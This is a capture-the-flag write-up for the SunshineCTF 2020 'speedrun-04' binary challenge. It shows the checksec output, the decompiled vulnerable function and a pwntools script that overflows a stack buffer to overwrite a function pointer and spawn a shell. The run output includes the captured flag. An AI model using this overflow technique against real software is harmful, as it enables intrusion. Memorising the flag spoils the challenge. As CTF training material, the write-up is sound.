# **speedrun-04**
## Task
nc chal.2020.sunshinectf.org 30004
File: chall_04
Tag: binary exploitation 

## Solution

## Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* No Canary assume BOF
* No PIE assume ROP
* System 64 bit
  
### Decompile with ghidra
```c
void vuln(void)
{
  char local_48 [56];
  code *local_10;
  
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}
void win(void)

{
  system("/bin/sh");
  return;
}
```
Easy challenge with the ROP, just overwrite the `local_10` value with `win` address
`local_10` is at `0x48-0x10` then the `win` address

### Exploit
```python
from pwn import *
binary = context.binary = ELF('./chall_04')
payload = b'a'*(0x48-0x10)
payload += p64(binary.sym.win)
p = remote('chal.2020.sunshinectf.org',30004)
p.sendline('IxZ')
p.sendline(payload)
p.interactive()

```

### Output
```
[*] '/home/kali/speedrun_sunshineCTF2020/chall_04'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done
[*] Switching to interactive mode
Like some kind of madness, was taking control.
$ ls
chall_04
flag.txt
$ cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
```
